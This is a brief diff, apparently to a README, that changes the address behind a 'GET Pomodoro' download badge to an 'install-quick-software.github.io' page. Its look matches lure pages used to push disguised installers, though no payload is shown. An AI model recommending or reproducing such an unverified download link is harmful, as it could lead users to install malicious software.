@@ -7,7 +7,7 @@
 <br>  
 
 <div align="center">  
-<a href="https://osx-app.github.io/.github/pomodoro">  
+<a href="https://install-quick-software.github.io/.github/pomodoro">  
 <img src="https://img.shields.io/badge/💻_GET_Pomodoro-red?style=for-the-badge&logo=apple" alt="GET Pomodoro">  
 </a>  
 </div>
